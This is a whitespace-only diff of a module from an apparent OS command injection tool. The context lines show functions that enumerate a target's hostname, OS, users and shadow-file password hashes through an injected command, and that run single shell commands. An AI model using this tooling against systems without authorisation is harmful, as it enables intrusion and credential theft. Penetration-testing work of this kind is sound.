@@ -23,13 +23,13 @@ from src.thirdparty.colorama import Fore, Back, Style, init
 from src.core.injections.semiblind.techniques.file_based import fb_injector
 
 """
- The "file-based" technique on Semiblind OS Command Injection.
+The "file-based" technique on Semiblind OS Command Injection.
 """
 
-"""
-Hostname enumeration
-"""
 
+"""
+ Hostname enumeration
+"""
 def hostname(separator, payload, TAG, delay, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename):
   cmd = settings.HOSTNAME
   response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
@@ -46,7 +46,8 @@ def hostname(separator, payload, TAG, delay, prefix, suffix, http_request_method
     output_file = open(filename, "a")
     output_file.write("    (!) The hostname is " + shell + ".\n")
     output_file.close()
-      
+
+
 """
 Retrieve system information
 """
@@ -83,6 +84,7 @@ def system_information(separator, payload, TAG, delay, prefix, suffix, http_requ
       output_file = open(filename, "a")
       output_file.write("    (!) The target operating system is " + target_os + ".\n")
       output_file.close()
+
 
 """
 The current user enumeration
@@ -131,6 +133,7 @@ def current_user(separator, payload, TAG, delay, prefix, suffix, http_request_me
       output_file.write("    (!) The current user is " + cu_account + "\n")
       output_file.close()
         
+
 """
 System users enumeration
 """
@@ -221,8 +224,8 @@ def system_users(separator, payload, TAG, delay, prefix, suffix, http_request_me
     sys.stdout.write("[ " + Fore.RED + "FAILED" + Style.RESET_ALL + " ]")
     sys.stdout.flush()
     print "\n" + Fore.YELLOW + "(^) Warning: It seems that you don't have permissions to read '" + settings.PASSWD_FILE + "' to enumerate users entries." + Style.RESET_ALL   
+ 
 
-        
 """
 System passwords enumeration
 """
@@ -267,7 +270,8 @@ def system_passwords(separator, payload, TAG, delay, prefix, suffix, http_reques
       sys.stdout.write("[ " + Fore.RED + "FAILED" + Style.RESET_ALL + " ]")
       sys.stdout.flush()
       print "\n" + Fore.YELLOW + "(^) Warning: It seems that you don't have permissions to read '" + settings.SHADOW_FILE + "' to enumerate users password hashes." + Style.RESET_ALL
-        
+      
+
 """
 Single os-shell execution
 """
@@ -284,6 +288,7 @@ def single_os_cmd_exec(separator, payload, TAG, delay, prefix, suffix, http_requ
     else:
       print Back.RED + "(x) Error: The '" + cmd + "' command, does not return any output." + Style.RESET_ALL
   sys.exit(0)
+
 
 """
 Check the defined options
